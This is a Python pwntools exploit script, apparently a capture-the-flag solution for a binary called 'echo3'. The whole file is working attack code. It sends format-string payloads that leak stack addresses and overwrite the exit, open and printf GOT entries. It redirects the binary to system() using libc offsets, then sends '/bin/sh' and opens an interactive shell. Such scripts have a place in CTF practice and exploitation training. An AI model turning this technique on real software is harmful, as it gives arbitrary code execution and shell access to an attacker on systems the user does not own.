#!/usr/bin/python

from pwn import *

def pad(strr):
	return strr + "\x00"*(107-len(strr))

exit_plt = 0x8048460
exit_got = 0x804a020
open_plt = 0x8048470
open_got = 0x804a024

printf_plt = 0x8048430
printf_got = 0x804a014
my_off_sys = 0x3d200
my_off_printf = 0x512d0
my_off_open = 0xe6730
off_sys = 0x3ad80
off_printf = 0x49590
off_open = 0xd57f0

config = '''
b *0x8048646
b *0x804864b
commands 1
x/32xw $esp
end
commands 2
x/32xw $esp
end
'''

#context.log_level = 'debug'
#s = remote('hackme.inndy.tw', 7720)
s = process('./echo3')
#gdb.attach(s, config)
raw_input('[Stop 1]')

#1 Read ebp & address of magic
payload = pad('%18$x0000' + '%14$xzzzz')
s.sendline(pad(payload))

ebp = s.recvuntil('0000')
ebp = int(ebp[:8], 16)
print 'ebp: ' + hex(ebp)

addr_magic = s.recvuntil('zzzz')
addr_magic = int(addr_magic[:8], 16)
print 'addr_magic: ' + hex(addr_magic)

#khong biet dat ten bien gi :v
sica = (ebp - addr_magic)/4 + 4

# Infinity loop
#2 overwrite magic = exit_got
payload = '%1$0' + str(exit_got) + 'lx'
payload += '%14$n' + '1111'
payload = pad(payload)
s.sendline(payload)
s.recvuntil('1111')
raw_input('[Stop 2: overwritten magic = exit_got]')

#3 overwrite exit_got = 0x08048623
payload = '%1$0' + str(0x08048623) + 'lx'
payload += '%4$n' + '2222'
payload = pad(payload)
s.sendline(payload)
s.recvuntil('2222')
raw_input('[Stop 3: overwritten exit_got = 0x8048623]')

#4 overwrite $4 = open_got, old_ebp = open_got + 2
payload = '%1$0' + str(open_got) + 'lx' 
payload += '%14$n'
payload += '33'
payload += '%18$n4444'
s.sendline(pad(payload))
s.recvuntil('4444')
raw_input('[Stop 4: overwritten magic=open_got, old_ebp=open_got+2]')

#5 read address of open() -> address of system()
payload = pad('%4$s' + '5555')
s.sendline(pad(payload))
_open = s.recvuntil('5555')
_open = u32(_open[:4])
print '_open: ' + hex(_open)
raw_input("[Stop 5: read _open's address]")

#calculate system's address
system = _open + (my_off_sys - my_off_open)
system = hex(system)[2:]
print 'system: 0x' + system
system_0 = int(system[4:], 16)
system_2 = int(system[:4], 16)
system = int(system, 16)
print 'system_0: ' + hex(system_0)
print 'system_2: ' + hex(system_2)
raw_input("[Stop 6: calculated system's address]")

#test %p
#payload = '%p '*30 + 'tttt'
#s.sendline(pad(payload))
#print s.recvuntil('tttt')
#raw_input('[Stop test]')

#from now, offset will plus 5 each send, that means $4 -> $9

#6 overwrite open_got = system_plt
payload = '%1$0' + str(system_0) + 'x'
payload += '%9$hn' # 4 + 5 = 9
payload += '%1$0' + str(system_2-system_0) + 'x'
payload += '%' + str(sica+5) + '$hn6666'
s.sendline(pad(payload))
s.recvuntil('6666')
raw_input('[Stop 7: overwritten open_got = system_plt]')

#7 overwrite $4 = printf_got
payload = '%1$0' + str(printf_got) + 'x'
payload += '%24$n7777' #14 + 5 + 5 = 24
s.sendline(pad(payload))
s.recvuntil('7777')
raw_input('[Stop 8: overwritten magic = printf_got]')

#8 overwrite printf_got = open_plt
payload = '%1$0' + str(open_plt) + 'x'
payload += '%19$n8888' #4 + 5 + 5 + 5 = 19
s.sendline(pad(payload))
s.recvuntil('8888')
raw_input('[Stop 9: overwritten printf_got = open_plt]')

s.sendline('/bin/sh')
raw_input('[Stop 10: sent /bin/sh]')
s.interactive()
s.close()
